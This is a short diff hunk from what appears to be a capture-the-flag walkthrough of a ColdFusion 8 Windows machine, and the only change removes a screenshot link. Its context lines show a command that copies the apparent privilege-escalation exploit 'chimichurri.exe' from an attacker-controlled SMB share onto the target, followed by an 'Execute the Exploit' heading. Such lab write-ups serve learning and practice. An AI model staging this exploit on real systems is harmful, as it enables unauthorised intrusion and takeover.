@@ -71,7 +71,6 @@ Nmap done: 1 IP address (1 host up) scanned in 137.00 seconds
 ```CSS
 C:\ColdFusion8\runtime\bin>copy \\10.10.14.34\share\chimichurri.exe
 ```
-![image](https://user-images.githubusercontent.com/83878909/229288769-d14bb122-6ee6-44b0-bda4-9e8aae81d22b.png)
 
 ### Execute the Exploit
 ```CSS
